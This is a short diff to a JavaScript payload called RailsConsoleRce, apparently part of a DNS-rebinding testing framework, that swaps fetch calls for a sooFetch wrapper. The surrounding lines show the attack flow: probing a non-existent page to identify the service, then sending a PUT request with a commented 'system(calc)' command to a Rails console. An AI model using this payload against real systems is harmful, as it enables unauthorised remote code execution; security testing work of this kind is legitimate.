@@ -16,7 +16,7 @@ const RailsConsoleRce = () => {
     function attack(headers, cookie, body) {
         let myHeaders = new Headers();
 
-        fetch('/nonexistingpage')
+        sooFetch('/nonexistingpage')
             .then(function (response) {
                 return response.text()
             })
@@ -35,7 +35,7 @@ const RailsConsoleRce = () => {
                 myHeaders.append("X-Requested-With", "XMLHttpRequest");
                 myHeaders.append("Content-Type", "application/x-www-form-urlencoded");
 
-                fetch(path, {
+                sooFetch(path, {
                     method: 'PUT',
                     headers: myHeaders,
                     //body: "input=system(%22calc%22)" // Windows
@@ -49,7 +49,7 @@ const RailsConsoleRce = () => {
     // Invoked to determine whether the rebinded service
     // is the one targeted by this payload. Must return true or false.
     async function isService(headers, cookie, body) {
-        return fetch("/nonexistingpage",{
+        return sooFetch("/nonexistingpage",{
             mode: 'no-cors',
             credentials: 'omit',
         })
